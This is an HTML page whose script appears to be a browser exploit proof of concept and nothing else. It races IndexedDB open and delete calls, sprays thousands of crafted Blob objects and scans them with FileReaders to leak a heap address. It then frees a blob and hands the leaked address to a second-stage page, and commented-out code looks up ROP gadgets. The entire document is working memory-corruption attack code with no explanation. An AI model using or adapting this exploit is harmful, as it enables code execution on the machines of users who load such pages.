<html>
<body>
<script>
var num=0
var aa=0
var heap_addr=0
 function String2ArrayBuffer(str, cb) {
        var b = new Blob([str]);
        var f = new FileReader();
        f.onload = function(e) {
            cb(e.target.result);
        }
        f.readAsArrayBuffer(b);
    }
var blob_list = []
/*var db; 
var request = window.indexedDB.open("db1", 1); 
var r2; 
var blob_list = []
request.onsuccess = function (event) { 
    alert('Open one'); 
    r2 = window.indexedDB.open("db1", 1);
    db = request.result; 
    r2.onsuccess = function (event) { 
    	let ab1 = new ArrayBuffer(0x148);
	
	alert('Open 2ne'); 
        var uaf_ta = new BigUint64Array(ab1);
        uaf_ta[0] = 0x12345679n;
        for(let j=1;j<38;j++){
            uaf_ta[j]=0x2333n;
        }
        uaf_ta[35] = 0x0n;
        for(let i = 0; i < 0x500; i++){
	        blob_list.push(new Blob([ab1]));
		
        }
	var r3=window.indexedDB.deleteDatabase("db1");
    }
}; 
var blob=blob_list[0]
console.log(blob);*/
var reader1 = new FileReader();
var reader2 = new FileReader();
var reader3 = new FileReader();
var reader4 = new FileReader();
var reader5 = new FileReader();
var reader6 = new FileReader();
var reader7 = new FileReader();
var reader8 = new FileReader();
var reader9 = new FileReader();
var reader10 = new FileReader();
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
async function step1(){
var db; 
var request = window.indexedDB.open("db1", 1); 
var r2; 
var blob_list = []
request.onsuccess = async function (event) { 
    alert('Open one'); 
    r2 = window.indexedDB.open("db1", 3);
    db = request.result; 
    r2.onerror = async function (event) { 
		
		
    	let ab1111 = new ArrayBuffer(0x150);
        var uaf_ta111 = new BigUint64Array(ab1111);
        uaf_ta111[0] = 0x12345679n;
        for(let j=1;j<35;j++){
            uaf_ta111[j]=0x101n;
        }
        uaf_ta111[36] = 0x101n;
        for(let i = 0; i < 0x5000; i++){
		var a=new Blob([ab1111]);
	        blob_list.push(a);
		
		}

	alert('Open 2ne'); 
	var r3= window.indexedDB.deleteDatabase("db1");
	console.log(blob_list)
	
	var blob1=blob_list[0];
	
	reader1.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader1.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			console.log(tmp[36])
			heap_addr=tmp[37]
			num=aa
		}
			
	});
	reader2.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader2.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+1
		}
	});
	reader3.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader3.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+2
		}
	});
	reader4.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader4.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+3
		}
	});
	reader5.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader5.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+4
		}
	});
	reader6.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader6.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+5
		}
	});
	reader7.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader7.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+6
		}
	});
	reader8.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader8.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+7
		}
	});
	reader9.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader9.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+8
		}
	});
	reader10.addEventListener("loadend", function() {
		var tmp = new BigUint64Array(reader10.result);
		if((tmp[37]!=0x0n&&tmp[37]>=0x500000n)||(tmp[36]!=0x0n&&tmp[36]>=0x500000n)){
			console.log(aa)
			console.log(tmp[37])
			heap_addr=tmp[37]
			num=aa+9
		}
	});
	for(aa=0;aa<0x5000;aa+=10){
		await sleep(50)
		var blob1=blob_list[aa];
		reader1.readAsArrayBuffer(blob1);
		var blob2=blob_list[aa+1];
		reader2.readAsArrayBuffer(blob2);
		var blob3=blob_list[aa+2];
		reader3.readAsArrayBuffer(blob3);
		var blob4=blob_list[aa+3];
		reader4.readAsArrayBuffer(blob4);
		var blob5=blob_list[aa+4];
		reader5.readAsArrayBuffer(blob5);
		var blob6=blob_list[aa+5];
		reader6.readAsArrayBuffer(blob6);
		var blob7=blob_list[aa+6];
		reader7.readAsArrayBuffer(blob7);
		var blob8=blob_list[aa+7];
		reader8.readAsArrayBuffer(blob8);
		var blob9=blob_list[aa+8];
		reader9.readAsArrayBuffer(blob9);
		var blob10=blob_list[aa+9];
		reader10.readAsArrayBuffer(blob10);
		if(heap_addr!=0)
			break;
	}
	
	let ab2 = new ArrayBuffer(0x1000*0x800);
        var pad = new BigUint64Array(ab2);
	pad[0] = 0x22334455n;
	for(let i = 0; i < 180; i++){
		var a=new Blob([ab2]);

        }
	console.log(num)
	b=blob_list[num]
	
	url = URL.createObjectURL(b)
	URL.revokeObjectURL(url)
	b=null
	blob_list[num]=null
	
	alert("ok")
	//window.location.href="file:///home/sad/Desktop/Default_small_noso/pocc.html#"+heap_addr
	location.replace("C:\\Users\\81021\\Desktop\\Default_5826\\pocc.html#"+heap_addr)
	
	
	
    }
}; 
}

step1()
/*var prog;
function log(x) {
    prog.innerText += `[+] ${x}\n`;
}
var get_gadget = function(name) {
        var s = document.queryCommandValue("get_gadget_" + name);
        console.log("raw gadget string: " + s);
        var addr = 0;
        for (var i = 0; i < s.length; i++) {
            addr *= 10;
            addr += parseInt(s[i], 10);
        }
        return addr;
    }
var poprcx = get_gadget("poprcx");
console.log("raw gadget string: " + poprcx.toString(16));*/
</script> 
</body>
</html>
